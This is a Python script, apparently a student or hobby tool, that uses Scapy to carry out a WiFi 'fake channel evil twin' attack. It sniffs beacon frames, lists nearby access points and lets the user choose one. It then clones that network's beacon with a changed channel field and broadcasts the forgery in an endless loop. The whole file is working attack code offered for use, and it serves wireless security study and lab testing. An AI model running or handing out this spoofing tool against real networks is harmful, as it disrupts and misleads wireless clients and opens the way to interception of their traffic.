from scapy.all import *
import six
import argparse

ap_list = []
ap_addr = []

parser = argparse.ArgumentParser(prog="Scapy fake channel evil twin attack",
                                 usage="python fakeChannel.py -i wlan0mon",
                                 description="Scapy based wifi fake channel attack")
parser.add_argument("-i", "--Interface", required=True,
                    help="The interface that you want to send packets out of, needs to be set to monitor mode")
args = parser.parse_args()

iface = args.Interface
""" AP Class to store properties about it. """


class Ap:
    def __init__(self, SSID, addr, channel, power, packet):
        self.SSID = SSID
        self.addr = addr
        self.channel = channel
        self.power = power
        self.packet = packet

    def __str__(self):
        return "{} ({}) with channel {} and power {}".format(self.SSID, self.addr, self.channel, self.power)


def filter_beacon(p):
    """ Filter WiFi beacon and probe response packets. """
    return p.haslayer(Dot11Beacon)


def print_ap(p):
    # If an error occur we doesn't treat the packet
    try:
        # If this address is already in the tab we doesn't treat the packet  
        if p.addr3 not in ap_addr:
            channel = 0
            netstats = p[Dot11Beacon].network_stats()

            # Get AP details
            bssid = p.addr3
            ssid = netstats['ssid']
            channel = netstats['channel']
            power = p.dBm_AntSignal

            ap_addr.append(bssid)
            ap_list.append(Ap(ssid, bssid, channel, power, p))

    except:
        return


def attack(k):
    # We take the packet with the index
    packet = ap_list[k].packet
    # We get layer that are after the channel info
    packet_last_part = packet.getlayer(6)
    # We remove Dsset info and every thing after it
    packet[Dot11Elt:2].remove_payload()
    # We create the propertie about the new channel
    channel = Dot11Elt(ID='DSset', info=chr((ap_list[k].channel + 5) % 14))

    # We create the new packet by concatenate the first part, the new channel, and the last part
    new_packet = packet / channel / packet_last_part
    new_packet.show()

    sendp(new_packet, iface=iface, inter=0.100, loop=1)


print("The script is scanning network, please wait")
sniff(iface=iface, lfilter=filter_beacon, prn=print_ap, timeout=5)

i = 1
# For each AP we print properties and a number
for ap in ap_list:
    print("{}   {:<15}  {:<5} {:<5}dBm)".format(i, ap.SSID, ap.channel, ap.power))
    i += 1

input_user = input("Choose the network that you want (use number) :")
input_user_int = int(input_user)

print("You choosed : {}".format(ap_list[input_user_int - 1].SSID))
attack(input_user_int - 1)
